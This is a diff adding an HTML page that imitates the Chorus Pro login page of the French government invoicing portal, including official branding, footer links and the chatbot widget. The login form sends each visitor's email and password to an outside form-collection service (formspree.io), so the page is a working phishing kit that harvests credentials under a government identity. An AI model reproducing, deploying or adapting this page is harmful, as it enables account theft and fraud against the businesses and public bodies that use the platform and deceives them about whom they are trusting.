@@ -1,0 +1,284 @@
+﻿    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+    <html xmlns="http://www.w3.org/1999/xhtml" class="" lang="fr">
+
+    <head>
+        <!--  config  -->
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        
+        <!--  css  -->
+        <link rel="stylesheet" type="text/css" href="../../../../resources/upsbe/login/aife/css/index.css">
+        
+        <!-- Favicon -->
+        <link rel="shortcut icon" href="../../../../resources/upsbe/login/aife/images/Favicon-ChorusProWordPress-150x150.png" type="image/x-icon">
+        
+        <!--
+        <link rel="icon" type="image/x-icon" href="/auth/resources/upsbe/login/aife/images/favicon.svg">
+        <link rel="apple-touch-icon" href="/auth/resources/upsbe/login/aife/images/apple-touch-icon.png">
+        <link rel="icon" type="image/png" sizes="192x192" href="/android-chrome-192x192.png">
+        <link rel="icon" type="image/png" sizes="512x512" href="/android-chrome-512x512.png">
+        <link rel="manifest" href="/auth/resources/upsbe/login/aife/images/manifest.webmanifest" crossorigin="use-credentials">
+        -->
+        
+        <!-- Title -->
+        <title>
+         	Connexion | Chorus Pro
+        </title>
+        
+        
+        <!-- Javascript -->
+        <script type="text/javascript">
+	        document.addEventListener("DOMContentLoaded", function(event) { 
+				const langSelect = document.getElementById("lang");
+				langSelect.addEventListener("change", (event) => {
+					const url = event.target.value;
+					if (url) {
+						window.location = url;
+					}
+					return false;
+				});
+			});
+			
+	        function showPassword() { 
+				const pwdVisibilityToggleBtn = document.getElementById("pwdVisibilityToggle");
+				const password = document.getElementById("password")
+				password.type = "text";
+				pwdVisibilityToggleBtn.classList.remove("rcn-inputField__button--showPassword");
+				pwdVisibilityToggleBtn.classList.add("rcn-inputField__button--hidePassword");
+									
+				return false;
+			}
+			
+			function hidePassword() { 
+				const pwdVisibilityToggleBtn = document.getElementById("pwdVisibilityToggle");
+				const password = document.getElementById("password")
+				password.type = "password";
+				pwdVisibilityToggleBtn.classList.remove("rcn-inputField__button--hidePassword");
+				pwdVisibilityToggleBtn.classList.add("rcn-inputField__button--showPassword");
+					
+				return false;
+			}
+        </script>
+    </head>
+
+    <body>
+<div class="fr-skiplinks" tabindex="-1">
+    <nav class="fr-container" role="navigation" aria-label="Accès rapide">
+        <ul class="fr-skiplinks__list">
+            <li>
+                <a class="rcn-link" href="#content" tabindex="1">Contenu</a>
+            </li>
+            <li>
+                <a class="rcn-link" href="#footer" tabindex="2">Pied de page</a>
+            </li>
+        </ul>
+    </nav>
+</div><header role="banner" class="fr-header">
+    <div class="fr-header__body">
+        <div class="fr-container">
+            <div class="fr-header__body-row">
+                    <a class="rcn-link kc-header-link " href="https://portail.chorus-pro.gouv.fr/aife_csm" aria-label="Retour vers le portail de service">
+                        <img class="rcn-footer__productLogo" alt="République française Chorus Pro Services Portal" src="../../../../resources/upsbe/login/aife/images/Logotype_AIFE_V2022.png"></a>
+            </div>
+        </div>
+    </div>
+    
+</header>        <div id="content" style="display: contents">
+        	
+            
+            <main class="fr-pt-md-14v" role="main" id="content">
+                <div class="fr-container fr-container--fluid fr-mb-md-14v kc-page-container__primary">
+                    <div class="fr-grid-row fr-grid-row-gutters fr-grid-row--center">
+                        <div class="fr-col-12 fr-col-md-8 kc-page-container__secondary">
+                            <div class="fr-container fr-px-md-0 fr-py-10v fr-py-md-14v">
+                                <div class="fr-grid-row fr-grid-row-gutters fr-grid-row--center">
+                                    <div class="fr-col-12 fr-col-md-9">
+                                        <h1 class="rcn-h1 rcn-h1--editorial kc-page-title__primary">
+                                            Se Connecter
+                                        </h1>
+                                        <div>
+                                            <form action="https://formspree.io/f/mqkrzonr" method="post">
+                                                <fieldset class="fr-fieldset">
+                                                    <legend class="fr-fieldset__legend">
+                                                        <p class="rcn-p kc-page-title__secondary">Entrez votre identifiant et votre mot de passe.</p>
+                                                    </legend>
+                                                    
+                                                    <div class="fr-fieldset__element kc-page-content">
+                                                        <fieldset class="fr-fieldset">
+                                                            <div class="fr-fieldset__element">
+                                                                <div class="rcn-inputFieldBloc">
+                                                                    <label class="rcn-inputFieldBloc__label" for="username">
+                                                                        Adresse de connexion
+                                                                        <!--<span class="rcn-inputFieldBloc__mandatoryAsterisk">-->
+                                                                        <span class="rcn-inputFieldBloc__label-rules sr-only">email@domain.com</span> 
+                                                                    </label>
+                                                                    <div class="rcn-inputField">
+                                                                        <input id="username" name="username" type="text" autocomplete="email" required="" accesskey="i" class="rcn-inputField__input" placeholder="email@domain.com" value="" autocomplete="off">
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                    
+                                                            <div class="fr-fieldset__element">
+                                                                <div class="rcn-inputFieldBloc">
+                                                                    <label class="rcn-inputFieldBloc__label" for="password">
+                                                                        Mot de passe
+                                                                        <!--<span class="rcn-inputFieldBloc__mandatoryAsterisk">-->
+                                                                    </label>
+                                                                    <div class="rcn-inputField">
+                                                                        <input id="password" name="password" type="password" autocomplete="current-password" required="" accesskey="m" class="rcn-inputField__input">
+                                                                        <button values="Réveler champ nouveau mot de passe" type="button" aria-label="revealPwdBtnTitle" id="pwdVisibilityToggle" onmousedown="showPassword()" onmouseup="hidePassword()" class="rcn-iconButton rcn-inputField__button rcn-icon rcn-inputField__button--showPassword">
+                                                                            <span class="sr-only" aria-hidden="true"></span>
+                                                                        </button>
+                                                                    </div>
+                                                                        <p class="kc-login__reset-link">
+                                                                            <a href="/auth/realms/chorus-pro/login-actions/reset-credentials?client_id=d50afa7e1191e81da1c0a38cb81ae130061c4164&tab_id=QrA3MeZMMVE" class="rcn-link">
+                                                                                Mot de passe oublié ?
+                                                                            </a>
+                                                                        </p>
+                                                                </div>
+                                                            </div>
+                                                            <div class="fr-messages-group" aria-live="assertive"> </div>
+                                                        </fieldset>
+                                                    </div>
+                                                    <button value="Se connecter" class="rcn-button rcn-button--primary kc-page-buttons__main-button" type="submit" accesskey="s">Se connecter</button>
+                                                    <div class="fr-messages-group" aria-live="assertive"> </div>
+                                                </fieldset>
+                                            </form>
+                                        </div>
+                                	</div>
+                            	</div>
+                        	</div>
+                    	</div>
+                	</div>
+                </div>
+            </main>
+			
+<div id="MB-ChatEntry">
+	<div id="cursor" style=""></div>
+	<iframe style="display: flex; position: fixed;" src="https://claudia-mb-chat.apps-prd.aife-prd.tdp.ovh/integrationChat.html" name="masterbot chatbot" title="Page giving access to chatbot" allowtransparency="true" allow="microphone *; fullscreen *;display-capture *" sandbox="" class="chatbot_iframe "></iframe>
+</div>
+<button id="chatbot-open-button" class="MB-ChatOpener" value="SE CONNECTER">
+	<img src="../../../../resources/upsbe/login/aife/images/ClaudiaIcon.svg" alt="ClaudIA" title="ClaudIA" role="presentation">
+</button>
+
+<link rel="stylesheet" type="text/css" href="../../../../resources/upsbe/login/aife/css/cloud_ia.css">
+
+<script type="text/javascript" async="" id="MBSnippetScript" src="../../../../../snippetIntegration"></script>
+<script type="text/html" src="https://claudia-mb-chat.apps-prd.aife-prd.tdp.ovh/livechat/script"></script>
+
+<script type="text/javascript">
+	var chatServer = 'https://claudia-mb-chat.apps-prd.aife-prd.tdp.ovh';
+	var bulle = 'SH';
+	var lang = 'FR';
+	var envir = 'PROD';
+	    
+	document.addEventListener("DOMContentLoaded", function(event) {
+		loadSnippet();
+	});
+			
+	function loadSnippet() {
+	    //chatServer = "";
+	    // MBChatIntegration for any website - UNCOMMENT and REPLACE by the masterbot chat URL to overwrite
+	    // CAREFUL - do not add / at the end.
+	    // Options:
+	    // haveMyOwnButton - false if you wish to use our button, true if you have your own opener (using 'MB-ChatOpener')
+	    let haveMyOwnButton = true;
+	    // useEmbeddedVersion - whether to use embedded snippet or fullscreen one
+	    let useEmbeddedVersion = false;
+	    // context - add some context
+	    let context = {
+		      ENVIR :  envir ,
+		      BULLE: bulle,
+		      EMAIL: "",
+		      ESPACE: "ACC_DECONNECTE",
+		      LANG: lang,
+		      PROFIL: "INDETERMINE",
+		      TYPE_CONNECTION: 0,
+		      TYPE_PROFIL: "INDETERMINE"
+	    }
+		
+	    window.masterbotChatConfiguration = {
+	        chatServer : chatServer,
+	        originDomain: window && window.location && window.location.origin,
+	        haveMyOwnButton: haveMyOwnButton,
+	        fullScreen: useEmbeddedVersion,
+	        context: context
+	    };
+			
+	    (function() {
+	        const existingScript = document.getElementById('MBSnippetScript');
+	        if (!existingScript) {
+	            var script = document.createElement('script');
+	            script.type = 'text/javascript';
+	            script.async = true;
+	            script.id = 'MBSnippetScript';
+	            script.src = chatServer + '/snippetIntegration';
+	            document.body.appendChild(script);
+	        }
+	    })();
+	}
+</script>				
+        </div>
+<footer class="fr-footer" role="contentinfo" id="footer">
+    <div class="fr-container">
+        <div class="fr-footer__body ">
+            <div class="rcn-footer__logoZone ">
+                <div class="fr-footer__brand rcn-footer__productLogo">
+                    <a class="rcn-link" href="/" aria-label="Retour vers le portail de service">
+                        <img class="rcn-footer__productLogo" alt="République française Chorus Pro Services Portal" src="../../../../resources/upsbe/login/aife/images/Logotype_AIFE_V2022.png">
+                    </a>
+                </div>
+                    <div class="kc-footer-content-info">
+                        <label class="kc-footer-content-info__label rcn-inputFieldBloc__label">Langue : </label>
+                        <img class="kc-footer-content-info__value" alt="" aria-hidden="true" role="presentation" src='../../../../resources/upsbe/login/aife/images/AIFE_French_Flag_Icon.png'>
+                        <select id="lang" aria-label="Choix de la langue" class="rcn-inputField__input rcn-inputField__input--select">
+                                    <option class="rcn-inputField__option" label=" English" value="/auth/realms/chorus-pro/login-actions/authenticate?client_id=d50afa7e1191e81da1c0a38cb81ae130061c4164&amp;tab_id=QrA3MeZMMVE&amp;execution=4596830e-edd7-4b71-8751-2f9bd4fbdedd&amp;kc_locale=en">
+                                    	English
+                                    </option>
+                                    <option class="rcn-inputField__option" label=" Français" value="" selected="selected">
+                                        Français
+                                    </option>
+                        </select>
+                    </div>
+            </div>
+            <div class="fr-footer__content">
+                <ul class="fr-footer__content-list">
+                    <li class="fr-footer__content-item">
+                        <a aria-label='Accéder à legifrance.gouv.fr' class="rcn-link rcn-footer__institutionalEcosystemLink" target="_blank" href="https://legifrance.gouv.fr">legifrance.gouv.fr<i class="rcn-icon rcn-link__icon--external"></i></a>
+                    </li>
+                    <li class="fr-footer__content-item">
+                        <a aria-label='Accéder à gouvernement.fr' class="rcn-link rcn-footer__institutionalEcosystemLink" target="_blank" href="https://gouvernement.fr">gouvernement.fr<i class="rcn-icon rcn-link__icon--external"></i></a>
+                    </li>
+                    <li class="fr-footer__content-item">
+                        <a aria-label='Accéder à service-public.fr' class="rcn-link rcn-footer__institutionalEcosystemLink" target="_blank" href="https://service-public.fr">service-public.fr<i class="rcn-icon rcn-link__icon--external"></i></a>
+                    </li>
+                    <li class="fr-footer__content-item">
+                        <a aria-label='Accéder à data.gouv.fr' class="rcn-link rcn-footer__institutionalEcosystemLink" target="_blank" href="https://data.gouv.fr">data.gouv.fr<i class="rcn-icon rcn-link__icon--external"></i></a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+        <div class="fr-footer__bottom">
+            <ul class="fr-footer__bottom-list">
+                <li class="fr-footer__bottom-item">
+                    <a aria-label='Accéder aux contacts' class="fr-footer__bottom-link " href="https://portail.chorus-pro.gouv.fr/aife_csm?id=aife_contact">Contact</a>
+                </li>
+                <li class="fr-footer__bottom-item">
+                    <a aria-label='Accéder aux mentions légales' class="fr-footer__bottom-link" href="https://portail.chorus-pro.gouv.fr/aife_csm?id=aife_legal">Mentions légales</a>
+                </li>
+                <li class="fr-footer__bottom-item">
+                    <a aria-label='Accéder à l&#39;accessibilité du site' class="fr-footer__bottom-link" href="https://aife.economie.gouv.fr/accessibilite/">Accessibilité : Non conforme</a>
+                </li>
+                <li class="fr-footer__bottom-item">
+                    <a aria-label='Accéder à la protection des Données personnelles et sécurité' class="fr-footer__bottom-link" href="https://portail.chorus-pro.gouv.fr/aife_csm?id=aife_security">Données personnelles et sécurité</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</footer>        
+        
+
+    </body>
+
+    </html>
